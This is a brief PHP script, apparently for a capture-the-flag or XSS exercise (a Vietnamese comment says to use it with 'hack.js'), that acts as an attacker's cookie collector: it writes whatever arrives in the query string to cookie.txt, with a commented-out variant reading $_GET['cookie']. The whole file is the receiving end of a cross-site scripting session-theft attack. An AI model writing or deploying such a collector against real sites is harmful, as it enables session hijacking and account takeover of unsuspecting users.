<?php
//dùng với flag hack.js
//file_put_contents('cookie.txt', $_GET['cookie'] . "\n", FILE_APPEND | LOCK_EX);


$cookie = $_SERVER['QUERY_STRING'];

$file = fopen("cookie.txt", "a+");
fwrite($file, "COOKIE: $cookie . \n");
fclose($file);

